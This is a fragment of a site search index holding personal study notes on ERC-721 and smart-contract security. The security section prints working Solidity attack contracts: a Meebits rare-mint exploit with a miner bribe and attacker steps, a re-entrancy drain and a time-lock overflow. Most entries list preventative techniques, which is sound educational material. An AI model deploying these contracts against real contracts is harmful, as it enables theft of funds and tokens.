</ul>"},{"location":"smart-contracts/erc-721/#erc721-metadata-json-schema-nft-metadata","title":"ERC721 Metadata JSON Schema - NFT metadata","text":"<p>Defined through the following JSON Schema:</p> <p>\u00b4\u00b4\u00b4 {     \"title\": \"Asset Metadata\",     \"type\": \"object\",     \"properties\": {         \"name\": {             \"type\": \"string\",             \"description\": \"Identifies the asset to which this NFT represents\"         },         \"description\": {             \"type\": \"string\",             \"description\": \"Describes the asset to which this NFT represents\"         },         \"image\": {             \"type\": \"string\",             \"description\": \"A URI pointing to a resource with mime type image/* representing the asset to which this NFT represents. Consider making any images at a width between 320 and 1080 pixels and aspect ratio between 1.91:1 and 4:5 inclusive.\"         }     } } \u00b4\u00b4\u00b4</p>"},{"location":"smart-contracts/erc-721/#interface-erc721enumerable-full-list-of-nfts","title":"Interface ERC721Enumerable - Full list of NFTs","text":"<p>Functions from interface ERC721Enumerable:</p> <ul> <li>totalSupply - A count of valid NFTs tracked by this contract, where each one of them has an assigned and queryable owner not equal to the zero address</li> <li>tokenByIndex - Returns the token identifier for the given index. This can then be used for example against ERC721Metadata.tokenURI</li> <li>tokenOfOwnerByIndex - Enumerate NFTs assigned to an owner. Index less than <code>balanceOf(_owner)</code></li> </ul>"},{"location":"smart-contracts/erc-721/#open-questions","title":"Open questions","text":"<ol> <li>What is the approved address for an NFT?</li> <li>safeTransferFrom - Why does it do the following When transfer is complete, this function     ///  checks if <code>_to</code> is a smart contract (code size &gt; 0). If so, it calls     ///  <code>onERC721Received</code> on <code>_to</code> and throws if the return value is not     ///  <code>bytes4(keccak256(\"onERC721Received(address,address,uint256,bytes)\"))</code></li> <li>setApprovalForAll - Is this what trading platforms such as OpenSea does when listing an NFT?</li> <li>Can ERC721 Metadata JSON Schema contain additional data for NFT traits</li> <li>Is an event such as approve put on chain?</li> </ol>"},{"location":"smart-contracts/erc-721/#contract-examples","title":"Contract examples","text":"<p>Superrare Cryptokitties Meebits</p>"},{"location":"smart-contracts/erc-721/#sources","title":"Sources","text":"<p>https://eips.ethereum.org/EIPS/eip-721</p>"},{"location":"smart-contracts/smart-contract-security/","title":"Smart contract security","text":""},{"location":"smart-contracts/smart-contract-security/#attack-cancel-transaction-if-unfavorable-draw","title":"Attack - Cancel transaction if unfavorable draw","text":"<p>Meebit NFT Exploit analysis</p> <p>Contract with vulnerability if the attacker knows which ids are extra valuable.</p> <pre><code>\n   /**\n     * Community grant minting.\n     */\n    function mintWithPunkOrGlyph(uint _createVia) external reentrancyGuard returns (uint) {\n        require(communityGrant);\n        require(!marketPaused);\n        require(_createVia &gt; 0 &amp;&amp; _createVia &lt;= 10512, \"Invalid punk/glyph index.\");\n        require(creatorNftMints[_createVia] == 0, \"Already minted with this punk/glyph\");\n        if (_createVia &gt; 10000) {\n            // It's a glyph\n            // Compute the glyph ID\n            uint glyphId = _createVia.sub(10000);\n            // Make sure the sender owns the glyph\n            require(IERC721(glyphs).ownerOf(glyphId) == msg.sender, \"Not the owner of this glyph.\");\n        } else {\n            // It's a punk\n            // Compute the punk ID\n            uint punkId = _createVia.sub(1);\n            // Make sure the sender owns the punk\n            require(Cryptopunks(punks).punkIndexToAddress(punkId) == msg.sender, \"Not the owner of this punk.\");\n        }\n        creatorNftMints[_createVia]++;\n        return _mint(msg.sender, _createVia);\n    }\n\n    function _mint(address _to, uint createdVia) internal returns (uint) {\n        require(_to != address(0), \"Cannot mint to 0x0.\");\n        require(numTokens &lt; TOKEN_LIMIT, \"Token limit reached.\");\n        uint id = randomIndex();\n\n        numTokens = numTokens + 1;\n        _addNFToken(_to, id);\n\n        emit Mint(id, _to, createdVia);\n        emit Transfer(address(0), _to, id);\n        return id;\n    }\n\n</code></pre> <p>Exploit contract</p> <pre><code>pragma solidity 0.8.4;\n\ninterface IMeebits {\n    function mintWithPunkOrGlyph(uint _createVia) external returns (uint);\n}\n\ncontract Exploit {\n\n    address private owner;\n    mapping(uint =&gt; bool) internal meebitIds;\n    IMeebits immutable meebits;\n\n    constructor(address addr) {\n        owner = msg.sender;\n        meebits = IMeebits(addr);\n    }\n\n    modifier onlyOwner() {\n        require(msg.sender == owner, \"Caller is not owner\");\n        _;\n    }\n\n    function deposit() public payable {}\n\n    function addMeebit(uint meebitId) onlyOwner public {\n        meebitIds[meebitId] = true;\n    }\n\n    function deleteMeebit(uint meebitId) onlyOwner public {\n        meebitIds[meebitId] = false;\n    }\n\n    function mintMeebit(uint _createVia) public returns(uint){\n\n        // Mint a new meebit with a punk or glyph\n        uint id = meebits.mintWithPunkOrGlyph(_createVia);\n\n        // Make sure it's a desired rare meebit\n        require(meebitIds[id], \"Not a rare meebit\");\n\n        // Pay miner bribe to include the block\n        (bool success, ) = block.coinbase.call{value: 1 ether}(\"\");\n        require(success);\n        return id;\n    }\n\n    function recover(address recipient, uint256 value, bytes memory args) onlyOwner public {\n        (bool success, ) = recipient.call{ value: value }(args);\n        require(success);\n    }\n\n}\n}\n</code></pre> <p>Attacker would do the following: 1. Create contract with the official meebit contract as a parameter. Attacker address would now be set as owner 1. Call addMeebit for all the rare meebits he would accept 1. Call deposit in a transaction where message.value is 1 eth (this will be used to pay the miners later). This is then deposited to the contract address 1. Create transaction against mintMeebit. If the meebit returned from the official contract was not added from addMeebit, the require statement would roll back the transaction. If the transaction was on the list, he'd use \u00b4block.coinbase.call\u00b4 to raise the gas provided for the transaction to 1ETH 1. Retrieve any extra deposited ETH to the contract via recover (10ETH was recovered by attacker)</p>"},{"location":"smart-contracts/smart-contract-security/#attack-re-entrancy","title":"Attack - Re-entrancy","text":"<p>https://solidity-by-example.org/hacks/re-entrancy/</p> <pre><code>contract Attack {\n    EtherStore public etherStore;\n\n    constructor(address _etherStoreAddress) {\n        etherStore = EtherStore(_etherStoreAddress);\n    }\n\n    // Fallback is called when EtherStore sends Ether to this contract.\n    fallback() external payable {\n        if (address(etherStore).balance &gt;= 1 ether) {\n            etherStore.withdraw(1 ether);\n        }\n    }\n\n    function attack() external payable {\n        require(msg.value &gt;= 1 ether);\n        etherStore.deposit{value: 1 ether}();\n        etherStore.withdraw(1 ether);\n    }\n\n    // Helper function to check the balance of this contract\n    function getBalance() public view returns (uint) {\n        return address(this).balance;\n    }\n}\n</code></pre> <p>Preventative techniques: - Ensure all state changes happen before calling external contracts - Use function modifiers that prevent re-entrancy</p> <p>Example of attack: - The DAO Attack</p>"},{"location":"smart-contracts/smart-contract-security/#attack-overflow","title":"Attack - Overflow","text":"<p>https://solidity-by-example.org/hacks/overflow/</p> <pre><code>contract Attack {\n    TimeLock timeLock;\n\n    constructor(TimeLock _timeLock) {\n        timeLock = TimeLock(_timeLock);\n    }\n\n    fallback() external payable {}\n\n    function attack() public payable {\n        timeLock.deposit{value: msg.value}();\n        /*\n        if t = current lock time then we need to find x such that\n        x + t = 2**256 = 0\n        so x = -t\n        */\n        timeLock.increaseLockTime(\n            type(uint).max - timeLock.lockTime(address(this))\n        );\n        timeLock.withdraw();\n    }\n}\n</code></pre> <p>Preventative techniques:</p> <ul> <li>Use SafeMath to will prevent arithmetic overflow and underflow</li> </ul>"},{"location":"smart-contracts/smart-contract-security/#attack-front-running","title":"Attack - Front running","text":"<p>Transactions take some time before they are mined. An attacker can watch the transaction pool and send a transaction, have it included in a block before the original transaction. This mechanism can be abused to re-order transactions to the attacker's advantage.</p> <pre><code>1. Alice deploys FindThisHash with 10 Ether.\n2. Bob finds the correct string that will hash to the target hash. (\"Ethereum\")\n3. Bob calls solve(\"Ethereum\") with gas price set to 15 gwei.\n4. Eve is watching the transaction pool for the answer to be submitted.\n5. Eve sees Bob's answer and calls solve(\"Ethereum\") with a higher gas price\n   than Bob (100 gwei).\n6. Eve's transaction was mined before Bob's transaction.\n   Eve won the reward of 10 ether.\n</code></pre> <p>Preventative techniques:</p> <ul> <li>use commit-reveal scheme</li> <li>use submarine send</li> </ul>"},{"location":"smart-contracts/smart-contract-security/#attack-self-destruct","title":"Attack - Self destruct","text":"<p>https://solidity-by-example.org/hacks/self-destruct/ Selfdestruct allows a smartcontract to be deleted from Ethereum Virtual Machine. As a parameter to it, you pass the adress to receive it and this can cause issues to the adress receiving it.</p> <p>Preventative techniques: - Avoid using address(this).balance (use msg.value instead)</p>"},{"location":"smart-contracts/smart-contract-security/#attack-read-private-data","title":"Attack - Read private data","text":"<p>https://solidity-by-example.org/hacks/accessing-private-data/ State variables can be read through web3, for example through \u00b4web3.eth.getStorageAt(\"0x3505a02BCDFbb225988161a95528bfDb279faD6b\", 2, console.log)\u00b4</p> <p>Preventative techniques:</p> <ul> <li>Don't store sensitive information on the blockchain</li> </ul>"},{"location":"smart-contracts/smart-contract-security/#attack-delegatecall","title":"Attack - Delegatecall","text":"<p>https://solidity-by-example.org/hacks/delegatecall/ delegatecall is tricky to use and wrong usage or incorrect understanding can lead to devastating results.</p> <p>Preventative techniques:</p> <ul> <li>Use stateless Library</li> </ul>"},{"location":"smart-contracts/smart-contract-security/#phishing-with-txorigin","title":"Phishing with tx.origin","text":"<p>https://solidity-by-example.org/hacks/phishing-with-tx-origin/ If contract A calls B, and B calls C, in C msg.sender is B and tx.origin is A.</p> <p>Preventative techniques:</p> <ul> <li>Use msg.sender instead of tx.origin</li> </ul>"},{"location":"smart-contracts/smart-contract-security/#hiding-malicious-code-with-external-contract","title":"Hiding Malicious Code with External Contract","text":"<p>https://solidity-by-example.org/hacks/hiding-malicious-code-with-external-contract/ In Solidity any address can be casted into specific contract, even if the contract at the address is not the one being casted.</p> <pre><code>contract Foo {\n    Bar bar;\n\n    constructor(address _bar) {\n        bar = Bar(_bar);\n    }\n</code></pre> <p>In the code above, there is no guarantee bar is of the class Bar. The owner calling the constructor could have passed another contract.</p> <p>Preventative techniques: </p> <ul> <li>Initialize a new contract inside the constructor</li> <li>Make the address of external contract public so that the code of the external contract can be reviewed</li> </ul>"}]}